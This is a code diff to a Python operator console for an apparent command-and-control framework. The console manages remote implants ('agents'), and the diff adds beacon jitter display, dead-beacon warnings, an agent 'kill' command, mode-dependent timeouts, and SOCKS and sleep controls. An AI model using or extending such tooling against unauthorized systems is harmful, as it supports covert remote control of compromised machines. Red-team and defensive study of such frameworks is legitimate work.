@@ -109,6 +109,12 @@ class SockPuppetsCLI(cmd.Cmd):
         for agent in agents:
             status = "\033[92m●\033[0m" if agent in self.server.get_active_agents() else "\033[91m●\033[0m"
             mode_badge = "\033[93m[BEACON]\033[0m" if agent['mode'] == 'beacon' else "\033[92m[STREAM]\033[0m"
+
+            # Check health for beacons
+            health_warning = ""
+            if agent['mode'] == 'beacon':
+                health_warning = self.server.check_agent_health(agent['id'])
+
             print(f"{status} \033[1m{agent['id']}\033[0m {mode_badge}")
             print(f"   Hostname:   {agent['hostname']}")
             print(f"   Username:   {agent['username']}")
@@ -117,7 +123,10 @@ class SockPuppetsCLI(cmd.Cmd):
             print(f"   Connected:  {agent['connected_at']}")
             print(f"   Last Seen:  {agent['last_seen']}")
             if agent['mode'] == 'beacon':
-                print(f"   Beacon:     {agent['beacon_interval']}s interval")
+                jitter_str = f" ±{agent.get('beacon_jitter', '0')}" if 'beacon_jitter' in agent else ""
+                print(f"   Beacon:     {agent['beacon_interval']}s{jitter_str} interval")
+                if health_warning:
+                    print(f"   \033[1;31m⚠ WARNING: {health_warning}\033[0m")
             print()
 
     def do_puppets(self, arg):
@@ -142,6 +151,8 @@ class SockPuppetsCLI(cmd.Cmd):
         active_agents = self.server.get_active_agents()
         for agent in beacon_agents:
             status = "\033[92m●\033[0m" if agent in active_agents else "\033[91m●\033[0m"
+            health_warning = self.server.check_agent_health(agent['id'])
+
             print(f"{status} \033[1m{agent['id']}\033[0m \033[93m[BEACON]\033[0m")
             print(f"   Hostname:   {agent['hostname']}")
             print(f"   Username:   {agent['username']}")
@@ -149,7 +160,10 @@ class SockPuppetsCLI(cmd.Cmd):
             print(f"   IP:         {agent['ip']}")
             print(f"   Connected:  {agent['connected_at']}")
             print(f"   Last Seen:  {agent['last_seen']}")
-            print(f"   Beacon:     {agent['beacon_interval']}s interval")
+            jitter_str = f" ±{agent.get('beacon_jitter', '0')}" if 'beacon_jitter' in agent else ""
+            print(f"   Beacon:     {agent['beacon_interval']}s{jitter_str} interval")
+            if health_warning:
+                print(f"   \033[1;31m⚠ WARNING: {health_warning}\033[0m")
             print()
 
     def do_streamers(self, arg):
@@ -196,26 +210,33 @@ class SockPuppetsCLI(cmd.Cmd):
             print(f"[-] Agent {agent_id} not found")
             return
 
-        active_agents = {a['id']: a for a in self.server.get_active_agents()}
-        if agent_id not in active_agents:
-            print(f"[-] Agent {agent_id} is not active")
-            return
-
         self.current_agent = agent_id
         agent_info = agents[agent_id]
         mode = agent_info['mode']
+
+        # Check if beacon might be dead
+        if mode == 'beacon':
+            death_status = self.server.check_agent_health(agent_id)
+            if death_status:
+                print(f"\033[1;31m[!] WARNING: {death_status}\033[0m")
+
         print(f"[+] Interacting with agent {agent_id} ({agent_info['hostname']})")
         print(f"[*] Mode: {mode.upper()}")
         if mode == 'beacon':
-            print(f"[*] Beacon interval: {agent_info['beacon_interval']}s")
-        print("[*] Type 'back' to return to main menu")
+            jitter_str = f" ±{agent_info.get('beacon_jitter', '0')}" if 'beacon_jitter' in agent_info else ""
+            print(f"[*] Beacon interval: {agent_info['beacon_interval']}s{jitter_str}")
+            active_agents = {a['id']: a for a in self.server.get_active_agents()}
+            if agent_id not in active_agents:
+                print(f"[*] Status: Disconnected (waiting for checkin)")
+        print("[*] Type 'back' or 'exit' to return to main menu")
+        print("[*] Type 'kill' to terminate the agent")
         print("[*] Type 'results' to view pending results")
         print("[*] Type 'socks <port>' to start SOCKS proxy")
         print("[*] Type 'sleep <seconds>' to set beacon interval")
         print("[*] Type 'upgrade' to switch to streaming mode")
         print("[*] Type 'downgrade [seconds]' to switch to beacon mode")
 
-        # Track last seen results for auto-display
+        # Track last seen results for auto-display (beacon mode only)
         last_result_count = 0
         result_check_thread = None
         stop_checking = threading.Event()
@@ -225,7 +246,9 @@ class SockPuppetsCLI(cmd.Cmd):
             nonlocal last_result_count
             while not stop_checking.is_set() and self.current_agent:
                 try:
-                    if mode == 'beacon':
+                    # Only check results in beacon mode
+                    current_agent = self.server.agents.get(agent_id)
+                    if current_agent and current_agent.mode == 'beacon':
                         current_results = self.server.get_agent_results(agent_id, clear=False)
                         if len(current_results) > last_result_count:
                             # New results arrived
@@ -244,20 +267,49 @@ class SockPuppetsCLI(cmd.Cmd):
                     pass
                 time.sleep(1)  # Check every second
 
-        # Start result checking thread for beacon mode
-        if mode == 'beacon':
-            result_check_thread = threading.Thread(target=check_results, daemon=True)
-            result_check_thread.start()
+        # Start result checking thread (works for both modes, auto-detects)
+        result_check_thread = threading.Thread(target=check_results, daemon=True)
+        result_check_thread.start()
 
         try:
             while self.current_agent:
                 try:
                     command = input(f"\033[1;33magent[{agent_id}]>\033[0m ").strip()
 
-                    if command.lower() == 'back':
+                    if command.lower() in ['back', 'exit']:
                         self.current_agent = None
                         print("[*] Returning to main menu")
                         break
+
+                    if command.lower() == 'kill':
+                        if not self.loop:
+                            print("[-] Event loop not available")
+                            continue
+
+                        try:
+                            # Check current mode
+                            current_agent = self.server.agents.get(agent_id)
+                            if current_agent and current_agent.mode == 'beacon':
+                                print(f"[*] Waiting for beacon to check in...")
+                                timeout = 65
+                            else:
+                                timeout = 5
+
+                            future = asyncio.run_coroutine_threadsafe(
+                                self.server.kill_agent(agent_id),
+                                self.loop
+                            )
+                            result = future.result(timeout=timeout)
+                            print(f"[+] {result}")
+
+                            # Exit agent interaction after kill
+                            if "killed" in result.lower():
+                                self.current_agent = None
+                                print("[*] Returning to main menu")
+                                break
+                        except Exception as e:
+                            print(f"[-] Error: {str(e)}")
+                        continue
 
                     if command.lower() == 'results':
                         # Show pending results from beacon
@@ -322,11 +374,19 @@ class SockPuppetsCLI(cmd.Cmd):
                                 print("[-] Event loop not available")
                                 continue
 
+                            # Check current mode
+                            current_agent = self.server.agents.get(agent_id)
+                            if current_agent and current_agent.mode == 'beacon':
+                                print(f"[*] Waiting for beacon to check in...")
+                                timeout = 65  # Wait up to 65 seconds for beacon
+                            else:
+                                timeout = 5
+
                             future = asyncio.run_coroutine_threadsafe(
                                 self.server.set_beacon_interval(agent_id, interval),
                                 self.loop
                             )
-                            result = future.result(timeout=5)
+                            result = future.result(timeout=timeout)
                             print(f"[+] {result}")
                         except ValueError:
                             print("[-] Invalid interval")
@@ -340,11 +400,19 @@ class SockPuppetsCLI(cmd.Cmd):
                             continue
 
                         try:
+                            # Check current mode
+                            current_agent = self.server.agents.get(agent_id)
+                            if current_agent and current_agent.mode == 'beacon':
+                                print(f"[*] Waiting for beacon to check in (interval: {current_agent.beacon_interval}s)...")
+                                timeout = 65  # Wait up to 65 seconds for beacon
+                            else:
+                                timeout = 5
+
                             future = asyncio.run_coroutine_threadsafe(
                                 self.server.upgrade_to_streaming(agent_id),
                                 self.loop
                             )
-                            result = future.result(timeout=5)
+                            result = future.result(timeout=timeout)
                             print(f"[+] {result}")
                         except Exception as e:
                             print(f"[-] Error: {str(e)}")
@@ -387,9 +455,17 @@ class SockPuppetsCLI(cmd.Cmd):
                         self.loop
                     )
 
-                    print("[*] Executing command...")
-                    result = future.result(timeout=35)
-                    print(result)
+                    # Check current mode
+                    current_agent = self.server.agents.get(agent_id)
+                    if current_agent and current_agent.mode == 'streaming':
+                        # Streaming mode - wait for immediate response
+                        print("[*] Executing command...")
+                        result = future.result(timeout=35)
+                        print(result)
+                    else:
+                        # Beacon mode - just queue
+                        result = future.result(timeout=5)
+                        print(result)
 
                 except KeyboardInterrupt:
                     print("\n[*] Use 'back' to return to main menu")
@@ -553,9 +629,11 @@ class SockPuppetsCLI(cmd.Cmd):
         arg = arg.strip().lower()
         if arg == 'on':
             logging.getLogger().setLevel(logging.DEBUG)
+            logging.getLogger('websockets').setLevel(logging.INFO)  # Still suppress websockets noise
             print("[+] Debug mode enabled")
         elif arg == 'off':
             logging.getLogger().setLevel(logging.INFO)
+            logging.getLogger('websockets').setLevel(logging.WARNING)
             print("[+] Debug mode disabled")
         else:
             print("[-] Invalid argument. Use: debug [on|off]")
